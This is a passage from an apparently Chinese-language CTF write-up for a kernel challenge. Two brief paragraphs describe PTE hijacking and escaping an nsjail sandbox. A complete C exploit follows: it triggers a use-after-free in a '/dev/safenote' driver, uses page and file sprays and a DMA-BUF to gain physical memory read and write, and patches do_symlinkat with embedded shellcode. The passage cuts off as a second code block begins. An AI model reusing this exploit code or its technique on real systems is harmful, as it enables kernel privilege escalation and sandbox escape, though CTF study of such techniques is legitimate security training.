+<p>第四，我们还需要知道劫持的是哪个mmap内存的pte，可以配合内核物理基地址泄露使用，内核中有些固定地址是存放了内核物理基地址固定偏移地址的指针的。我们劫持pte然后修改其为固定地址，再去对每一个mmap内存进行check，既可以泄露出来地址，又找到对应的mmap内存。</p>
+<p>第五，题目开启了nsjail沙盒隔离，普通的提权shellcode是行不通的，需要用到特殊shellcode，修改用户fs和proxy来突破隔离。</p>
+<h1 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04.EXP"></a>0x04.EXP</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Kernel.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SPRAY_NUM 0x400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_SPRAY_NUM 0x200</span></span><br><span class="line"><span class="type">char</span> *buf, key[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">int</span> ko_fd;</span><br><span class="line"><span class="type">long</span> kernel_entry = <span class="number">0xfffffe0000000000</span>,kernel_base;</span><br><span class="line"><span class="type">sem_t</span> sem1, sem2, sem3;</span><br><span class="line"><span class="type">long</span>* ibuf;</span><br><span class="line"><span class="type">int</span> file_spray[FILE_SPRAY_NUM],pipefd[<span class="number">0x100</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">void</span>* page_spray[PAGE_SPRAY_NUM];</span><br><span class="line"><span class="type">int</span> dup_spray[<span class="number">0x1000</span>], dup1_spray[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(ko_fd, <span class="number">0x1337</span>, &amp;idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(ko_fd, <span class="number">0x1338</span>, &amp;idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">uaf_dele</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(ko_fd, <span class="number">0x1339</span>, &amp;idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/vda&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose…&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_user_land();</span><br><span class="line">    <span class="comment">//signal(SIGSEGV, (sighandler_t)get_shell);</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line">    buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ibuf = (<span class="type">long</span>*)buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i * <span class="number">0x10000</span>UL),</span><br><span class="line">            <span class="number">0x8000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">            MAP_ANONYMOUS | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) &#123;</span><br><span class="line">            perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> dmafd = creat(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dmafd == <span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">&quot;dma_heap&quot;</span>);</span><br><span class="line">    ko_fd = open(<span class="string">&quot;/dev/safenote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (ko_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ko dev&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (add(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x50</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (uaf_dele(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;uaf delete&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dele(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;delete&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAY_NUM / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        file_spray[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (file_spray[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    dele(<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = FILE_SPRAY_NUM / <span class="number">2</span> + <span class="number">1</span>; i &lt; FILE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        file_spray[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (file_spray[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAY_NUM / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        close(file_spray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAY_NUM / <span class="number">2</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j * <span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">    <span class="comment">// Allocate DMA-BUF heap</span></span><br><span class="line">    <span class="type">int</span> dma_buf_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);</span><br><span class="line">    <span class="comment">// Allocate many PTEs (2)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = PAGE_SPRAY_NUM / <span class="number">2</span>; i &lt; PAGE_SPRAY_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j * <span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    <span class="type">int</span> ezdup = <span class="number">-1</span>, ezdup1 = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span>* evil;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = FILE_SPRAY_NUM / <span class="number">2</span>; k &lt; FILE_SPRAY_NUM; k += <span class="number">2</span>) &#123;</span><br><span class="line">        ezdup = file_spray[k], ezdup1 = file_spray[k + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1000</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((dup_spray[j] = dup(ezdup)) &lt; <span class="number">0</span> || (dup1_spray[j] = dup(ezdup1)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;dup&quot;</span>)</span>; CLOSE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//block();</span></span><br><span class="line">        evil = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">            <span class="comment">// We wrote ‘H&#x27;(=’A’+7) but if it changes the PTE overlaps with the file</span></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="type">char</span>*)(page_spray[i] + <span class="number">7</span> * <span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>) &#123; <span class="comment">// +38h: f_count</span></span><br><span class="line">                evil = page_spray[i] + <span class="number">0x7000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] Found overlapping page: %p\n&quot;</span>, evil);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (evil != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1000</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (close(dup_spray[j]) &lt; <span class="number">0</span> || close(dup1_spray[j]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;close&quot;</span>)</span>; CLOSE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evil == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Target not found.&quot;</span>)</span>; CLOSE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//block();</span></span><br><span class="line">    munmap(evil, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span>* dmabuf = mmap(evil, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">        MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">char</span>*)dmabuf = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Get physical AAR/AAW</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// Corrupt physical address of DMA-BUF</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> (dup(ezdup) &lt; <span class="number">0</span> || dup(ezdup1) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA - BUF now points to PTE: 0x%016lx\n&quot;</span>, dmabuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA - BUF now points to PTE: 0x%016lx\n&quot;</span>, *(<span class="type">size_t</span>*)dmabuf);</span><br><span class="line">    <span class="comment">// Leak kernel physical base</span></span><br><span class="line">    <span class="type">void</span>* wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">            wwwbuf = page_spray[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> phys_base = ((*(<span class="type">size_t</span>*)wwwbuf) &amp; ~<span class="number">0xfff</span>) - <span class="number">0x1c04000</span> - <span class="number">0x1dfd000</span> - <span class="number">0x3000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Physical kernel base address: 0x%016lx\n&quot;</span>, phys_base);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Overwriting do_symlinkat…&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> phys_func = phys_base + <span class="number">0x42cc40</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123; <span class="number">0xf3</span>,<span class="number">0xf</span>,<span class="number">0x1e</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x41</span>,<span class="number">0x5f</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0xef</span>,<span class="number">0x49</span>,<span class="number">0xcc</span>,<span class="number">0x42</span>,<span class="number">0x0</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0xbf</span>,<span class="number">0x0</span>,<span class="number">0x6b</span>,<span class="number">0xa7</span>,<span class="number">0x2</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0x70</span>,<span class="number">0x26</span>,<span class="number">0x1c</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0xbf</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x8f</span>,<span class="number">0x1b</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0xb7</span>,<span class="number">0xc0</span>,<span class="number">0x68</span>,<span class="number">0xa7</span>,<span class="number">0x2</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0xd0</span>,<span class="number">0xa</span>,<span class="number">0x1c</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0xbf</span>,<span class="number">0x20</span>,<span class="number">0x53</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0xf0</span>,<span class="number">0xc0</span>,<span class="number">0x45</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc3</span>,<span class="number">0x48</span>,<span class="number">0xbf</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x8f</span>,<span class="number">0x1b</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x98</span>,<span class="number">0x28</span>,<span class="number">0x8</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x4</span>,<span class="number">0x24</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x8</span>,<span class="number">0x48</span>,<span class="number">0xb8</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x22</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0xb8</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x18</span>,<span class="number">0x48</span>,<span class="number">0xb8</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x44</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x20</span>,<span class="number">0x48</span>,<span class="number">0xb8</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x55</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x28</span>,<span class="number">0x48</span>,<span class="number">0xb8</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x30</span>,<span class="number">0x49</span>,<span class="number">0x8d</span>,<span class="number">0x87</span>,<span class="number">0xc6</span>,<span class="number">0x11</span>,<span class="number">0x40</span>,<span class="number">0x1</span>,<span class="number">0xff</span>,<span class="number">0xe0</span>,<span class="number">0xcc</span>, &#125;;</span><br><span class="line">    <span class="type">void</span>* p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(wwwbuf + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] GO!GO!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, symlink(<span class="string">&quot;/jail/x&quot;</span>, <span class="string">&quot;/jail&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed…&quot;</span>);</span><br><span class="line">    close(ko_fd);</span><br><span class="line">    block();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 